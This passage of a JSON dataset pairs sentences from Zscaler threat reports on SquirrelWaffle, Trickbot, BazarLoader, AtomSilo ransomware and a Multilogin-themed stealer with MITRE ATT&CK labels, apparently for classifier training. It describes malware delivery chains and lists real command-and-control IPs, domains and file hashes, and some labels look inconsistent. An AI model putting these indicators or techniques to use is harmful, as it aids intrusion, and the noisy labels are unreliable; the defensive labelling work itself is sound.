contains another Base64 encoded string that includes the victim\u2019s computer name, username, application data directory, and workgroup.", "labels": ["T1041"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "This payload is also encrypted with the same XOR-based algorithm and key as the HTTP POST path component.", "labels": ["T1041"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "The SquirrelWaffle CnC responds with a Base64 encoded payload that uses the same encryption schema with another format that uses two tab characters as delimiter between fields.", "labels": ["TA0011", "T1132"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "The SquirrelWaffle CnC response may also contain a second-stage payload.", "labels": ["TA0011"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "An example decrypted response is shown below:", "labels": ["T1132"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "This second-stage payload will be written to a filename that consists of eleven random alphanumeric characters appended with a .txt extension, and then executed by SquirrelWaffle.", "labels": [], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "Zscaler ThreatLabz has observed Squirrelwaffle deliver an executable file with the MD5 hash 116301FD453397FDF3CB291341924147.", "labels": ["T1105"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "This file is packed and decrypted in memory to produce a Cobalt Strike stager with the MD5 hash 38DB72B33ABCEA250F5B7CB5AB514B2C, which further downloads the Cobalt Strike beacon.", "labels": ["S0154", "S0154", "T1140"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "Figure 11 below shows interesting strings in the Cobalt Strike stager that impersonates a [jQuery request](https://github.com/threatexpress/malleable-c2/blob/master/jquery-c2.3.11.profile).", "labels": ["S0154", "T1001"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "The EICAR string is likely an artifact from the threat actor using a [demo version of Cobalt Strike](https://blog.cobaltstrike.com/2015/10/14/the-cobalt-strike-trials-evil-bit/).", "labels": ["S0154"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "![Figure 11: Cobalt Strike stager delivered by Squirrelwaffle with interesting strings highlighted.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Strings%20in%20cobaltstrike.PNG)", "labels": ["S0154", "T1105"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "Figure 11: Cobalt Strike stager delivered by Squirrelwaffle with interesting strings highlighted.", "labels": ["S0154", "T1105"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "The Cobalt Strike stager sends an HTTPS GET request to 213.227.154[.]92 with the path /jquery-3.3.1.slim.min.js.", "labels": ["S0154", "T1001"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "The Cobalt Strike CnC server responds with a jQuery file with the encrypted Cobalt Strike beacon embedded as binary data in the middle of the file as shown in Figure 12.", "labels": ["S0154", "TA0011", "S0154", "T1105"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "![Figure 12: Encrypted Cobalt Strike beacon embedded in jQuery code starting at offset 0xfaf.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/jquery.png)", "labels": ["S0154"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "Figure 12: Encrypted Cobalt Strike beacon embedded in jQuery code starting at offset 0xfaf.", "labels": ["S0154", "T1105"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "This binary data consists of shellcode that decrypts the Cobalt Strike beacon using the [XOR-based algorithm](https://sysopfb.github.io/malware,/reverse-engineering/2018/10/08/Beacon-in-a-jquery.html) replicated below in Figure 13.", "labels": ["S0154", "T1140"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "![Figure 13: Cobalt Strike beacon decryption algorithm.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Algorithm.png)", "labels": ["S0154", "T1140"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "Figure 13: Cobalt Strike beacon decryption algorithm.", "labels": ["S0154"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "The Cobalt Strike beacon observed by Zscaler ThreatLabz contains the following CnC servers:", "labels": ["S0154", "TA0011"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "![Figure 14: Zscaler Cloud Sandbox detection of Squirrelwaffle Loader](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Sandbox%20report%20of%20loader.PNG)", "labels": [], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "Figure 14: Zscaler Cloud Sandbox detection of Squirrelwaffle Loader", "labels": [], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "After the Emotet botnet takedown earlier this year, criminal threat actors are filling that void.", "labels": ["S0367"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "Squirrelwaffle appears to be a new loader taking advantage of this gap.", "labels": [], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "It is not yet clear if Squirrelwaffle is developed and distributed by a known threat actor or a new group.", "labels": [], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "However, similar distribution techniques were previously used by Emotet.", "labels": ["S0367"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "| T1059 | Command and Scripting Interpreter |", "labels": ["T1059", "T1059"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "| T1592 | Gather Victim Host Information |", "labels": ["T1592"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "| T1569 | System Services |", "labels": ["T1569"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "| T1137 | Office Application Startup |", "labels": ["T1137"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "| T1055 | Process Injection |", "labels": ["T1055", "T1055", "T1055"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "| T1140 | Deobfuscate/Decode Files or Information |", "labels": ["T1140", "T1140"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "| T1436 | Commonly Used Port |", "labels": ["T1509"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "| T1437 | Standard Application Layer Protocol |", "labels": ["T1437"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "| T1106 | Native API |", "labels": ["T1106"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "### Squirrelwaffle ZIP archive URLs", "labels": [], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "### Squirrelwaffle Loader URLs", "labels": [], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "### Squirrelwaffle Word Document File MD5 Hashes", "labels": [], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "### Squirrelwaffle VBS File MD5 Hash", "labels": ["T1059"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "### Squirrelwaffle Loader MD5 Hashes", "labels": [], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "### Domain used by the DLL for Squirrelwaffle CnC", "labels": [], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "### Cobalt Strike Stager MD5 Hashes", "labels": ["S0154"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "### Cobalt Strike CnC Servers", "labels": ["S0154"], "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}, {"sentence": "New Trickbot and BazarLoader campaigns use multiple delivery vectors", "labels": ["S0266", "S0534", "TA0001"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "The [Zscaler ThreatLabz](https://www.zscaler.com/threatlabz/threat-map-dashboard) research team monitors thousands of files daily tracking new and pervasive threats, including one of the most prominent banking trojans of the last five years: Trickbot.", "labels": ["S0266"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "Trickbot has been active since 2016 and is linked to a large number of malicious campaigns involving bitcoin mining and theft of banking information, personal identifying information (PII), and credentials.", "labels": ["S0266", "TA0010", "T1496"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "BazarLoader is a spinoff of this trojan, developed by the same authors.", "labels": ["S0534"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "ThreatLabz has discovered Trickbot operators using new approaches to delivering payloads in recent attack campaigns.", "labels": ["S0266", "TA0001"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "The malware samples we analyzed were well-crafted and highly obfuscated with sandbox-evading capabilities.", "labels": ["TA0005"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "In this blog post, we will show analysis of the different delivery vectors used by Trickbot and BazarLoader.", "labels": ["S0266", "S0534"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "1.Script and LNK files added evasion techniques to leverage Malware threats.", "labels": ["T1059"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "2.Multilayer obfuscation is used to preclude analysis of JS and LNK files.", "labels": ["T1027", "T1059"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "3.An Office attachment drops an HTA file with snippets of HTML and javascript functions.", "labels": ["T1566", "T1059", "T1059"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "**Trickbot is expanding its range of file types for malware delivery**", "labels": ["S0266"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "In previous campaigns, Trickbot payloads were generally dropped as malicious attachments to Microsoft Office files.", "labels": ["S0266", "T1566"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "In the last month, we\u2019ve seen that malware has also used javascript files at a high volume, along with a range of other file formats, as shown in the following charts:", "labels": ["T1059"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "![Overall Trickbot blocked in the sandbox](https://lh4.googleusercontent.com/nYTw6h8k29JBGhwhhdbc-mjmG4C2oWIAhHu2Vu5ZzGMyBN7xD-0uVOavLStFbt-k5GF4eJcRL8BtlyhGohPr7oSja8nlKQVip9YeCTgNcIzeM9pyPP9V5XMyOJ8HZTXOj-LmH-Yl=s0)", "labels": ["S0266"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "*Fig1:Trickbot blocked in the Zscaler Cloud Sandbox*", "labels": ["S0266"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "*![Bazar overall blocked in the sandbox](https://lh3.googleusercontent.com/RZPwTirzFvm1T9IoVZHWgdxTRyniwcsRZ_F64TrjqtLTScKuOvhtVGP4w1xIiDsnbU5jlZznuJHcY1OH-W1IplAfY8kx-cRK6ya_MG-MfgvBJWrfESJ4uSCO4xW91bsZnaeJ72fj=s0)*", "labels": ["S0534"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "*Fig2:BazarLoader blocked in the Zscaler Cloud Sandbox*", "labels": ["S0534"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "* Trickbot spreading through scripting files", "labels": ["S0266", "T1059"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "* Trickbot spreading through LNK files", "labels": ["S0266"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "* BazarLoader spreading through Office attachments", "labels": ["S0534", "T1566"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "**Trickbot spreading through scripting files**", "labels": ["S0266", "T1059"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "Trickbot gains intrusion using spam emails bundled with malicious javascript attachments, such as the following:\u00a0\u00a0", "labels": ["S0266", "T1566"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "*Fig3:Spam email attachment*", "labels": ["T1566"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "In this case, the Javascript [***5B606A5495A55F2BD8559778A620F21B***] file has three layers of obfuscation that are mostly used to evade and bypass sandbox environments.", "labels": ["T1059"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "*Fig4:First layer of obfuscation in javascript*", "labels": ["T1059"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "In addition to taking extreme effort to make javascript files highly obfuscated, the malware authors have also added large amounts of junk code to the end to make debugging more difficult.", "labels": ["T1027", "T1059", "T1027"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "The junk code is just random generated obfuscated strings that do not play any role with the malicious code.", "labels": ["T1027"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "![Junk code to make analysis difficult](https://lh5.googleusercontent.com/kS4l8D-a0K-3ZMpQHrE6nA9mE_2BZqXHhyayzJCjoDcoENf0mfe88xwkpFNOIuuUmP0pa7F5pjwZdL6blF6LqEJb326AoPL0Eys6GIJ77SwNiydOdpyVs0Ld4SisYZOH0nqqLLez=s0)", "labels": ["T1027"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "*Fig5:Junk code to make analysis difficult*", "labels": ["T1027"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "Using the **eval()** function we have de-obfuscated the second layer in which malicious code is embedded with more junk code.", "labels": ["T1027"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "We can see that the Trickbot authors used the **setTimeout()** method, which evaluates an expression after a 967 milliseconds to delay execution in the sandbox.", "labels": ["S0266"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "This helps the malware evade sandbox environments.", "labels": ["T1497"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "*Fig6: Second layer of obfuscation in javascript*", "labels": ["T1027"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "The malicious Javascript executes cmd.exe as a child process, then cmd.exe executes powershell.exe to download Trickbot as payload.", "labels": ["TA0002", "TA0002", "S0266", "T1059", "T1059", "T1059", "T1059"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "***Wscript.exe ->cmd.exe->powershell.exe***", "labels": ["T1059", "T1059"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "Powershell.exe embedded with base64 encoded command and after decoded following command is:", "labels": ["T1059", "T1132"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "*Fig8:Zscaler Cloud Sandbox detection of Javascript Downloader*", "labels": ["T1059"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "**Trickbot spreading through LNK files**", "labels": ["S0266"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "Windows LNK (LNK) extensions are usually seen by users as shortcuts, and we have frequently observed cybercriminals using LNK files to download malicious files such as Trickbot.", "labels": ["S0266", "T1204"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "Trickbot hides the code in the argument section under the properties section of the LNK file.", "labels": ["S0266"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "The malware author added extra spaces in between the malicious code to attempt to make it more difficult for researchers to debug the code.", "labels": ["T1027"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "We\u2019ve [seen this technique used previously](https://www.zscaler.com/blogs/security-research/independence-day-greeting-campaign-delivers-emotet-5) in the Emotet campaign using malicious Office attachments in 2018.", "labels": ["S0367", "T1566"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "**Downloading Trickbot :**", "labels": ["S0266"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "1.LNK downloads the file from 45.148.121.227/images/readytunes.png using a silent argument so that the user is not able to see any error message or progress action.", "labels": ["T1105", "T1564"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "3.Finally, the file is renamed from application1\\_form.pdf to support.exe and executed.", "labels": ["T1036"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "Here, support.exe is Trickbot.", "labels": ["S0266"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "**BazarLoader spreading through Office attachments**", "labels": ["S0534", "T1566"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "Malicious office documents drop the HTA file to **\u201cC\\ProgramData\\sda.HTA\u201d**.", "labels": ["T1059", "T1059"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "This HTA file contains HTML and vbscript designed to retrieve a malicious DLL to infect a vulnerable Windows host with BazarLoader.", "labels": ["S0534", "T1059", "T1574"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "Once macro-enabled, the mshta.exe process executes to download a payload.", "labels": ["TA0002", "T1203", "T1105"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "This campaign has been observed delivering BazarLoader and Trickbot in the past.", "labels": ["S0534", "S0266"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "*Fig11:Attack chain of DOC file to download BazarLoader*", "labels": ["S0534"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "Base64 encoded data is implemented in the HTML <div> tag which is used later with javascript.", "labels": ["T1059"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "*Fig12:Dropped HTA file : Malicious base64 encoded under HTML <div> section*", "labels": ["T1059"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "*Fig13:Dropped HTA file : Decode Base64 data*", "labels": ["T1059"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "**Networking : C&C to download BazarLoader**", "labels": ["TA0011", "S0534", "T1105"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "*Fig14:Sending request to download BazarLoader*", "labels": ["S0534"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "We have also observed newly registered domains (NRDs) specifically created to distribute these payloads, using a stealer delivered through spam email and bundled with a malicious Microsoft Office attachment.", "labels": ["T1583", "T1566", "T1059"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "*Fig16:Zscaler Cloud Sandbox detection of Malicious Office file Downloader*", "labels": ["T1059"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "| T1082 | System Information Discovery |", "labels": ["T1082", "T1082"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "| T1564 | Hide Artifacts |", "labels": ["T1564"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "| T1027 | Obfuscated Files or Information |", "labels": ["T1027"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "**C&C:**", "labels": ["TA0011", "TA0011"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "| jolantagraban.pl | Trickbot |", "labels": ["S0266"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "| glareestradad.com | BazarLoader |", "labels": ["S0534"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "| francopublicg.com | BazarLoader |", "labels": ["S0534"], "document": "zscaler_2021-10-08_new-trickbot-and-bazarloader-campaigns"}, {"sentence": "AtomSilo Ransomware Enters the League of Double Extortion", "labels": [], "document": "zscaler_2021-10-15_atomsilo-ransomware-enters-league-double"}, {"sentence": "Ransomware is used widely in cyberattacks to disrupt the victim's organization.", "labels": ["T1486"], "document": "zscaler_2021-10-15_atomsilo-ransomware-enters-league-double"}, {"sentence": "Over the last two years, many attackers have evolved their ransomware tactics to include data exfiltration.", "labels": ["T1486", "TA0010"], "document": "zscaler_2021-10-15_atomsilo-ransomware-enters-league-double"}, {"sentence": "This tactic is known as \"double-extortion\": attackers demand ransom for the data decryption in addition to the ransom to prevent public release of the stolen data.", "labels": ["T1486"], "document": "zscaler_2021-10-15_atomsilo-ransomware-enters-league-double"}, {"sentence": "AtomSilo is a new player on the scene, and in this blog, we'll break down the details of their attacks.", "labels": [], "document": "zscaler_2021-10-15_atomsilo-ransomware-enters-league-double"}, {"sentence": "AtomSilo ransomware emerged around September 2021, with their tactics including exfiltrating and publishing their first victim's data.", "labels": ["T1486", "TA0010"], "document": "zscaler_2021-10-15_atomsilo-ransomware-enters-league-double"}, {"sentence": "We'll break down one of their attacks, which started with initial access through exploiting a vulnerability in [Atlassian\u2019s Confluence collaboration software](https://news.sophos.com/en-us/2021/10/04/atom-silo-ransomware-actors-use-confluence-exploit-dll-side-load-for-stealthy-attack/).", "labels": ["TA0001", "T1190"], "document": "zscaler_2021-10-15_atomsilo-ransomware-enters-league-double"}, {"sentence": "The ransomware operators planted a back door using legitimate software via a dll side loading technique.", "labels": ["T1486", "TA0003", "T1036", "T1574"], "document": "zscaler_2021-10-15_atomsilo-ransomware-enters-league-double"}, {"sentence": "The backdoor allowed remote code execution of Windows Shell commands through WMI (Windows Management Interface), which operators exploited using compromised administrative accounts before dropping AtomSilo.", "labels": ["T1190", "T1059", "T1047", "T1078"], "document": "zscaler_2021-10-15_atomsilo-ransomware-enters-league-double"}, {"sentence": "The AtomSilo payload is 64-bit and packed with a modified UPX packer.", "labels": ["T1027"], "document": "zscaler_2021-10-15_atomsilo-ransomware-enters-league-double"}, {"sentence": "Once executed, it enumerates each drive and drops a ransom note in each folder except the few listed in *Table1*.", "labels": ["T1083", "T1486"], "document": "zscaler_2021-10-15_atomsilo-ransomware-enters-league-double"}, {"sentence": "![](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/AtomSilo%20Ransomware/Ransom%20note%20new%20edited.PNG)", "labels": [], "document": "zscaler_2021-10-15_atomsilo-ransomware-enters-league-double"}, {"sentence": "*Figure 1: AtomSilo ransom note*", "labels": ["T1486"], "document": "zscaler_2021-10-15_atomsilo-ransomware-enters-league-double"}, {"sentence": "It enumerates each file and encrypts all folders and files EXCEPT those that contain the below names:", "labels": ["T1083", "T1486"], "document": "zscaler_2021-10-15_atomsilo-ransomware-enters-league-double"}, {"sentence": "Ransomware appends\u00a0 \u201c.atomsilo\u201d extensions to files after encryption.", "labels": ["T1486"], "document": "zscaler_2021-10-15_atomsilo-ransomware-enters-league-double"}, {"sentence": "AtomSilo uses XOR and AES Encryption algorithms to encrypt files.", "labels": ["T1486"], "document": "zscaler_2021-10-15_atomsilo-ransomware-enters-league-double"}, {"sentence": "![](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/AtomSilo%20Ransomware/Generating%20key-%20edited-1.png)", "labels": [], "document": "zscaler_2021-10-15_atomsilo-ransomware-enters-league-double"}, {"sentence": "*Figure 2: AtomSilo generates encryption keys using*AESKEYGENASSIST", "labels": [], "document": "zscaler_2021-10-15_atomsilo-ransomware-enters-league-double"}, {"sentence": "Then, it encrypts it with 14 rounds of AES encryption.", "labels": ["T1486"], "document": "zscaler_2021-10-15_atomsilo-ransomware-enters-league-double"}, {"sentence": "![](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/AtomSilo%20Ransomware/Encrypt_aesenc-final%20edited.png)", "labels": [], "document": "zscaler_2021-10-15_atomsilo-ransomware-enters-league-double"}, {"sentence": "*Figure 3: Encrypting data using AES algorithm*", "labels": ["T1486"], "document": "zscaler_2021-10-15_atomsilo-ransomware-enters-league-double"}, {"sentence": "It encrypts chunks of the file, not the complete file.", "labels": ["T1486"], "document": "zscaler_2021-10-15_atomsilo-ransomware-enters-league-double"}, {"sentence": "![](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/AtomSilo%20Ransomware/File%20comparision-edited-2.png)", "labels": [], "document": "zscaler_2021-10-15_atomsilo-ransomware-enters-league-double"}, {"sentence": "According to their leak sites, AtomSilo actors won't attack the following types of organizations:", "labels": [], "document": "zscaler_2021-10-15_atomsilo-ransomware-enters-league-double"}, {"sentence": "![](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/AtomSilo%20Ransomware/Atom-leak%20page-1%20edited.png)", "labels": [], "document": "zscaler_2021-10-15_atomsilo-ransomware-enters-league-double"}, {"sentence": "AtomSilo published around 900 GB data as shown in the below screenshot:", "labels": [], "document": "zscaler_2021-10-15_atomsilo-ransomware-enters-league-double"}, {"sentence": "![](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/AtomSilo%20Ransomware/Atom-leak%20page-2%20edited.png)", "labels": [], "document": "zscaler_2021-10-15_atomsilo-ransomware-enters-league-double"}, {"sentence": "*Figure 6: Victim data published on data leak site*", "labels": ["TA0010"], "document": "zscaler_2021-10-15_atomsilo-ransomware-enters-league-double"}, {"sentence": "*Figure 7: Zscaler Cloud Sandbox detection of AtomSilo ransomware*", "labels": ["T1486"], "document": "zscaler_2021-10-15_atomsilo-ransomware-enters-league-double"}, {"sentence": "New MultiloginBot Phishing Campaign", "labels": ["T1566"], "document": "zscaler_2021-10-22_new-multiloginbot-phishing-campaign"}, {"sentence": "Multilogin is an application designed to make it easier to log into multiple accounts on a single website or platform simultaneously.", "labels": [], "document": "zscaler_2021-10-22_new-multiloginbot-phishing-campaign"}, {"sentence": "Recently, Zscaler ThreatLabz has come across a live phishing campaign that is targeting genuine Multilogin users by tricking the users into downloading a malicious installer.", "labels": ["T1566", "T1566"], "document": "zscaler_2021-10-22_new-multiloginbot-phishing-campaign"}, {"sentence": "The threat actor has taken great care to match every detail, starting from website layout to the url pattern used for downloading the application, in order to impersonate as the legitimate website.", "labels": ["T1036"], "document": "zscaler_2021-10-22_new-multiloginbot-phishing-campaign"}, {"sentence": "The malicious installer installs a stealer (named as multilogin), written in Dotnet, on the compromised machine.", "labels": ["T1204"], "document": "zscaler_2021-10-22_new-multiloginbot-phishing-campaign"}, {"sentence": "This stealer gathers sensitive information from the victim's system and sends it to its telegrambot in a zip format.", "labels": ["TA0009"], "document": "zscaler_2021-10-22_new-multiloginbot-phishing-campaign"}, {"sentence": "As a first step, the threat actors have cloned the legitimate website, giving it a similar domain name, in order to trick the user into visiting the phishing website and downloading the malicious installer hosted on it.", "labels": ["T1566"], "document": "zscaler_2021-10-22_new-multiloginbot-phishing-campaign"}, {"sentence": "Like the normal installer, the malicious installer creates a full environment, starting with registry changes, then creating required folders (explained later), for the effective execution of the malware.", "labels": ["TA0003"], "document": "zscaler_2021-10-22_new-multiloginbot-phishing-campaign"}, {"sentence": "In order to achieve persistence on the compromised machine, the malicious installer creates a shortcut file in the ***All Users startup folder*** as can be seen in the below snapshot.", "labels": ["TA0003", "T1547"], "document": "zscaler_2021-10-22_new-multiloginbot-phishing-campaign"}, {"sentence": "It is to be noted that the installer drops the malware at the user\u2019s selected installation path at the time of installing the application.", "labels": ["TA0003"], "document": "zscaler_2021-10-22_new-multiloginbot-phishing-campaign"}, {"sentence": "* **AutoFills**: Consists of text files containing browser\u2019s autofill information.", "labels": ["T1555"], "document": "zscaler_2021-10-22_new-multiloginbot-phishing-campaign"}, {"sentence": "* **Cookies:** Consists of text files containing browser\u2019s cookies information.", "labels": ["T1539"], "document": "zscaler_2021-10-22_new-multiloginbot-phishing-campaign"}, {"sentence": "* **IP:** Consists of a text file containing IP address information.", "labels": ["T1049"], "document": "zscaler_2021-10-22_new-multiloginbot-phishing-campaign"}, {"sentence": "* **Passwords:** Consists of text files containing user's login information.", "labels": ["TA0006"], "document": "zscaler_2021-10-22_new-multiloginbot-phishing-campaign"}, {"sentence": "After successful installation, the final GUI (Graphical User Interface) comes up with an enabled check box to launch the application named as multilogin (hereinafter referred to as malware).", "labels": ["T1036"], "document": "zscaler_2021-10-22_new-multiloginbot-phishing-campaign"}, {"sentence": "### **Information Gathering**", "labels": ["TA0009"], "document": 